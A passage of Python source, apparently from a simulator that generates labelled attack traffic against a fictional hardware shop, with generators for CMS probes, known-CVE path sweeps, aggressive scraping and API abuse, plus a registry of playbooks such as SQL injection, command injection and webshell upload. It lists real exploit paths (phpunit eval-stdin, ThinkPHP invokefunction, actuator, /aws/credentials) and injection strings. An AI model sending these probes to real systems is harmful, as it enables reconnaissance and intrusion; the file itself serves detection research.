    "/cgi-bin/luci/;stok=/locale", "/boaform/admin/formLogin",
    "/HNAP1/", "/setup.cgi", "/shell", "/.git/HEAD",
    "/actuator/gateway/routes", "/actuator/env", "/api/v2/cmdb/system/admin",
    "/solr/admin/info/system", "/_ignition/execute-solution",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/index.php?s=/index/think/app/invokefunction",
    "/aws/credentials", "/config/getuser", "/telescope/requests",
)


def cms_probe(rng, style, known):
    """Sweep for a content management system that is not installed.

    No baseline, no reconnaissance, no pause to read anything: the list is
    fixed before the first request and the run is over in under a minute. This
    is the shape of most of what actually arrives at a small shop.
    """
    found = False
    for path in rng.sample(CMS_PATHS, rng.randint(8, 14)):
        outcome = yield AttackStep("GET", path, "enumeration", "cms", 0.4,
                                   note="sweeping for a CMS")
        found = found or _answered(outcome)
    return frozenset({"found_path"}) if found else frozenset()


def cve_sweep(rng, style, known):
    """Try a handful of known-exploit paths and move on.

    Arrives with somebody else's list, tries it, leaves. Nothing here is
    tailored to this application and nothing here is meant to be.
    """
    found = False
    for path in rng.sample(CVE_PATHS, rng.randint(6, 12)):
        outcome = yield AttackStep("GET", path, "enumeration", "sweep", 0.5,
                                   note="somebody else's exploit list")
        found = found or _answered(outcome)
    return frozenset({"found_path"}) if found else frozenset()


def aggressive_scrape(rng, style, known):
    """Take the whole catalogue, fast, ignoring robots.txt.

    Not hostile and not friendly. Nothing it does is an attack -- every
    request is one a customer could make -- and the only thing separating it
    from a shopper is rate and breadth. Labelled `crawling`, because that is
    what it is, and included because the boundary is where false positives
    live.
    """
    yield AttackStep("GET", "/robots.txt", "crawling", "scrape", 1.0,
                     note="fetched, and about to be ignored")
    slugs = ("fasteners", "power-tools", "electrical", "lighting",
             "hand-tools", "kitchen", "decorating", "safety", "garden",
             "storage")
    for slug in rng.sample(slugs, rng.randint(6, 10)):
        yield AttackStep("GET", f"/c/{slug}", "crawling", "scrape", 0.25,
                         note="category page")
    for number in rng.sample(range(1, 60), rng.randint(15, 30)):
        yield AttackStep("GET", f"/p/{number}", "crawling", "scrape", 0.2,
                         note="product page")
    return frozenset()


def api_abuse(rng, style, known):
    """Hammer the JSON endpoints the shop front uses.

    The endpoints are prepared-statement clean, so the payloads get nowhere.
    What is left in the log is volume and shape against `/api/`, which is a
    behaviour rather than a signature -- and behaviour is the part no
    per-request rule can see.
    """
    probes = ("oak", "brass", "'", "1 OR 1=1", "%", "../", "<script>",
              "a" * 200)
    for probe in rng.sample(probes, rng.randint(5, 8)):
        yield AttackStep("GET", "/api/autocomplete?q=" + _q(probe),
                         "api_call", "api", 0.3, note="autocomplete probe")
    for number in rng.sample(range(1, 40), rng.randint(10, 20)):
        yield AttackStep("GET", f"/api/stock?id={number}", "api_call", "api",
                         0.2, note="walking stock ids")
    return frozenset()


#: Every playbook, by name. `tools.py` and `campaigns.py` reference these.
PLAYBOOKS = {
    "recon": recon,
    "directory_enumeration": directory_enumeration,
    "sqli_probing": sqli_probing,
    "sqli_extraction": sqli_extraction,
    "sqli_time_based": sqli_time_based,
    "path_traversal": path_traversal,
    "idor_walk": idor_walk,
    "forced_browsing": forced_browsing,
    "verb_tampering": verb_tampering,
    "command_injection": command_injection,
    "ssti": ssti,
    "ssrf": ssrf,
    "upload_webshell": upload_webshell,
    "brute_force": brute_force,
    "credential_stuffing": credential_stuffing,
    "password_spray": password_spray,
    "xss": xss,
    "session_tampering": session_tampering,
    "cms_probe": cms_probe,
    "cve_sweep": cve_sweep,
    "aggressive_scrape": aggressive_scrape,
    "api_abuse": api_abuse,
}
